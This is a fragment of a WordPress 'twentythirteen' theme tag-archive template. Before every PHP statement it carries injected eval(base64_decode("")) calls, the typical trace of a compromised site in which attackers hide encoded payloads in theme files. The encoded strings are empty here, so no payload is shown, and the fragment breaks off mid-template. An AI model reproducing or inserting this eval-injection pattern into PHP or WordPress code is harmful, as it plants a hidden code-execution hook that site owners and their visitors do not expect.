		<?php	 	eval(base64_decode("")); if ( have_posts() ) : ?>
			<header class="archive-header">
				<h1 class="archive-title"><?php	 	eval(base64_decode("")); printf( __( 'Tag Archives: %s', 'twentythirteen' ), single_tag_title( '', false ) ); ?></h1>

				<?php	 	eval(base64_decode("")); if ( tag_description() ) : // Show an optional tag description ?>
